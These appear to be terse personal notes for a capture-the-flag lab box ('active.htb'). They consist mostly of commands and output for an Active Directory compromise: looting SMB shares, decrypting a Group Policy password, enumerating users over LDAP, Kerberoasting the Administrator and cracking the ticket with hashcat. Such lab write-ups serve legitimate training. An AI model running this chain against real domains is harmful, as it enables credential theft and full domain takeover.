this box hahs some smb shares,
lets download them:
smbmap -H {IP}
smbclient -L={IP} -U Administrator #try a login
smbclient //{IP}/{sharename} #connect to specifiec share
RECURSE ON
PROMPT OFF
mget *


findin the user and passwordhash
find . -type f -name "*.xml" -exec cat {} \;

active.htb\SVC_TGS:edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

active.htb\SVC_TGS:GPPstillStandingStrong2k18

smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100
smbclient -L=10.10.10.100 -U SVC_TGS


with these creds we can check the kerberos users
ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName


we can enum ad users with impacket:
impacket-GetADUsers -all active.htb/svc_tgs -dc-ip 10.10.10.100

Administrator
Guest
krbtgt
SVC_TGS


ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b
"dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!
(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))"
serviceprincipalname | grep -B 1 servicePrincipalName
p -B 1 servicePrincipalName
dn: CN=Administrator,CN=Users,DC=active,DC=htb
servicePrincipalName: active/CIFS:445


impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2024-06-15 16:57:53.698143


impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100 -request
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$89ec5ae2c85b96e879ba1d9be3336d88$3627c28caeb93fa9592f40822ffc9bb7b21f095891229899247c4e4c92e4ccf9bbcac586d6e68cb453cc93acb0899ad5bc4d22b7a0c92022b79ba4ec1a2e74db3a63a3995a48cd9b0dffab162fe442d94afa88cc3f62145eba8d10f8f0b62a0539b52b54a0c3422b33b29db2a06c596bdbe8577e8ed4563bad45e81dd9b3eaa1d992e40f00faa2852b0d78eb7741ab12f062e4e38ed7268f5e425508e31bc11f285a8f37e3b3e1633248536a8afc796f3c22092cb2229719bcb3d27c2f8b97d51bc3e0e7cf22bf3375f6721a87bd7e1da52e1a9b9b070e8eff7dae6729889f794cb535177162972cc9f6cc1fdc635ac59ad55e94fa561d3254020d1f29e39580760426b24c96feb748b82e17111f9d9fd87f05aa7257e29643d97b5c3970a3067c844dae99788b2cd7eee94c956956eedad438ef265eea7f6b00350ffd96b9cbd320884beab735884650dfd3e0ba660d30b9489e7cc8ce7d7129d3f1dc4ca30664d571e77e40ab3b933297329529e462b4d7c1d2dba2c51880d7525b58eb6a9cf40c3cf5abe027ccbe2d77940f53a73d8208516cdc25c81037ad8793b9ed37a988ac0a312c8a7e68b6f4ab8464fb1a2e6aeaabdcad4b8b21162271fa12033950094b127269367c665f5c424b8760e2cd45135a144c06bd6e9f7d5b429211f2424daf910a73fc8cc8af3a80b64fc499a774a196763c88a80ce26d436f8a44794d2fa29f78bea7fb6bcc406a4e0e990da28113de2a9ec8485ec2605ba027005a6b8a6759d5071bd776c0a37c9c2c7354853e32c3c2d5b726911478479a29f8d59dc9a6eb34b7879ffdc26c3fd20dae85a0e324a1b9e5a41b5bfa3d9754e2cc059cb8b2acc72d6063afef9950f9cca5672d6ab6d3bce5c68a8d44a175bd7b585da78bd8c0cbef37362e24ca8b7d2e6b2ada30e7e90c745f1e7c305a3d31fb94ee93b6cc605bc69ab14ce86b7119b3a2c5e572980fd5999ce04820d806d671cd03f5d7a8c4cccf743f6137695fedcd5931d283a7bca9fd12a398b9b195f31f769a0b82c7bf7a7c89f9e2e157b33dbf4ea7a8f5422c77ea04c311ee06ee738253588354982b00f4ce3881dc58df090a51ae89235c303bc5c1e3ca408af734f4fa202ec98e986eee261b6c606de95f727641aad71639d5f4ea1fde17410d8fecd4d667c52e25a04069b508b6108106f54c8654c69f00643259e3fc7044a74a6a5be07dd25dbecc511f2904a452449021bb7c5f4b26e4ceea8513a55de7

hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force --potfile-disable
active\administrator:Ticketmaster1968

smbclient -L=10.10.10.100 -U active\administrator
